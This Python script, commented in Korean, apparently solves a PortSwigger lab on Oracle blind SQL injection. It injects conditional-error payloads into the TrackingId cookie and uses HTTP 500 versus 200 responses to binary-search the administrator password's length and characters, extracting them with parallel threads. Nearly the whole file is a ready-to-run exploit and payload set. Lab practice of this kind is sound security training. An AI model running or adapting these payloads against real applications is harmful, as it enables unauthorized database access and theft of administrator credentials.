#!/usr/bin/env python3
"""
Blind SQL Injection - Conditional Errors (Oracle)
PortSwigger Lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

취약점 위치: TrackingId 쿠키
판별 기준:  HTTP 500 (조건 참 → 0 나누기 에러 발생) vs HTTP 200 (조건 거짓)
주입 대상:  administrator 계정의 password
DB:         Oracle

Oracle 조건부 에러 페이로드 구조:
  ' || (SELECT CASE WHEN (<조건>) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '
  - 조건이 참 → TO_CHAR(1/0) 실행 → ORA-01476 (divisor equal to zero) → HTTP 500
  - 조건이 거짓 → 'a' 반환 → 정상 처리 → HTTP 200
"""

import argparse
import sys
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 출력 가능한 ASCII 문자 전체(33~126)를 ASCII 순서로 사용한다.
# 이진 탐색이 SQL 문자열 비교(ASCII 순서)와 방향이 일치해야 하므로 정렬 순서가 중요하다.
# 단일 인용부호(')는 SQL 페이로드 문자열 구분자와 충돌하므로 제외한다.
CHARSET = "".join(chr(code) for code in range(33, 127) if chr(code) != "'")

HTTP_ERROR_STATUS = 500


def inject(session_cookie: str, url: str, tracking_id: str, payload: str) -> bool:
    """TrackingId 쿠키에 페이로드를 삽입하고 HTTP 500 여부(조건 참)를 반환한다."""
    cookies = {"TrackingId": f"{tracking_id}{payload}", "session": session_cookie}
    resp = requests.get(url, cookies=cookies, verify=False, timeout=10)
    return resp.status_code == HTTP_ERROR_STATUS


def check_vulnerability(session_cookie: str, url: str, tracking_id: str) -> bool:
    """참/거짓 조건에서 HTTP 상태 코드 차이로 취약점 존재 여부를 확인한다."""
    true_payload  = "' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '"
    false_payload = "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) || '"
    true_result  = inject(session_cookie, url, tracking_id, true_payload)
    false_result = inject(session_cookie, url, tracking_id, false_payload)
    return true_result and not false_result


def get_password_length(session_cookie: str, url: str, tracking_id: str, max_len: int = 50) -> int:
    """이진 탐색으로 administrator 비밀번호 길이를 찾는다."""
    lower_bound, upper_bound = 1, max_len
    while lower_bound < upper_bound:
        midpoint = (lower_bound + upper_bound) // 2
        payload = (
            f"' || (SELECT CASE WHEN LENGTH(password)>{midpoint}"
            f" THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') || '"
        )
        if inject(session_cookie, url, tracking_id, payload):
            lower_bound = midpoint + 1
        else:
            upper_bound = midpoint
    return lower_bound


def get_char_at(session_cookie: str, url: str, tracking_id: str, pos: int) -> str:
    """이진 탐색으로 비밀번호의 pos번째 문자를 찾는다."""
    lower_bound, upper_bound = 0, len(CHARSET) - 1
    while lower_bound < upper_bound:
        midpoint = (lower_bound + upper_bound) // 2
        mid_char = CHARSET[midpoint]
        # Oracle은 SUBSTR 사용 (SUBSTRING 미지원)
        payload = (
            f"' || (SELECT CASE WHEN SUBSTR(password,{pos},1)>'{mid_char}'"
            f" THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') || '"
        )
        if inject(session_cookie, url, tracking_id, payload):
            lower_bound = midpoint + 1
        else:
            upper_bound = midpoint

    candidate = CHARSET[lower_bound]
    verify_payload = (
        f"' || (SELECT CASE WHEN SUBSTR(password,{pos},1)='{candidate}'"
        f" THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') || '"
    )
    return candidate if inject(session_cookie, url, tracking_id, verify_payload) else "?"


def extract_password(session_cookie: str, url: str, tracking_id: str, length: int, workers: int) -> str:
    """각 위치의 문자를 병렬로 추출한다."""
    password = ["?"] * length

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {
            executor.submit(get_char_at, session_cookie, url, tracking_id, pos): pos - 1
            for pos in range(1, length + 1)
        }
        completed = 0
        for future in as_completed(futures):
            index = futures[future]
            char = future.result()
            password[index] = char
            completed += 1
            print(f"\r[*] 진행: {''.join(password)} ({completed}/{length})", end="", flush=True)

    print()
    return "".join(password)


def main():
    parser = argparse.ArgumentParser(description="Blind SQLi — Conditional Errors (Oracle) 자동 추출기")
    parser.add_argument("url",         help="랩 URL (예: https://xxxx.web-security-academy.net)")
    parser.add_argument("tracking_id", help="정상 TrackingId 쿠키 값")
    parser.add_argument("--workers",   type=int, default=10, help="병렬 스레드 수 (기본: 10)")
    parser.add_argument("--max-len",   type=int, default=50, help="비밀번호 최대 길이 탐색 범위 (기본: 50)")
    args = parser.parse_args()

    session_cookie = requests.get(args.url, verify=False, timeout=10).cookies.get("session", "")

    print("[1] 취약점 확인 중...")
    if not check_vulnerability(session_cookie, args.url, args.tracking_id):
        print("[-] 취약점이 확인되지 않았습니다. TrackingId 또는 URL을 확인하세요.")
        sys.exit(1)
    print("[+] 취약점 확인 완료 (HTTP 500 / 200 차이 존재)")

    print("[2] 비밀번호 길이 탐색 중...")
    length = get_password_length(session_cookie, args.url, args.tracking_id, args.max_len)
    print(f"[+] 비밀번호 길이: {length}")

    print(f"[3] 비밀번호 추출 중... (스레드: {args.workers})")
    password = extract_password(session_cookie, args.url, args.tracking_id, length, args.workers)

    print(f"\n[+] administrator 비밀번호: {password}")


if __name__ == "__main__":
    main()
